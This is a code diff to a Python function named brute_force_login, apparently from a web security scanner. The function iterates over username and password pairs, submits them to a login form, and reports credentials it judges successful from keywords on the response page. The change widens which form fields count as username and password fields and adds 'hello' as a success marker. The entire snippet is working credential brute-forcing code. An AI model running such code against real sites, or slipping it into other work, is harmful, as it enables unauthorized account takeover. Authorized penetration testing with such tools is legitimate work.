@@ -62,9 +62,9 @@ def brute_force_login(page_url, session):
     for username, password in product(usernames, passwords):
         data = {}
         for name in input_names:
-            if "user" in name or "email" in name or "login" in name:
+            if "user" in name or "email" in name or "uid" in name or "login" in name:
                 data[name] = username
-            elif "pass" in name:
+            elif "pass" in name or "passw" in name or "password" in name or "pwd" in name:
                 data[name] = password
             else:
                 data[name] = "test"
@@ -78,7 +78,7 @@ def brute_force_login(page_url, session):
             text = response.text.lower()
 
             # Heuristic to detect login success
-            if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in"]):
+            if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in", "hello"]):
                 print(f"[+] Brute-force success: {username}:{password}")
                 return (username, password)
 
